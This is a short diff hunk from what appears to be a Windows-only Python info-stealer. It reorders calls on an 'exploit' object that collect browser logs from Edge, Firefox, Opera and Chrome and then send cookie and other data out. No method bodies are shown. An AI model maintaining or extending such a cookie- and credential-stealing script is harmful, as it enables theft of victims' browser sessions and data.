@@ -137,10 +137,10 @@ if __name__ == "__main__" and platform.system() == "Windows":
     exploit.getData()
     exploit.sendMainData()
 
-    exploit.edgeLog()
     exploit.firefoxLog()
     exploit.operaLog()
     exploit.chromeLog()
+    exploit.edgeLog()
     exploit.sendCookieLog()
 
     exploit.credits()
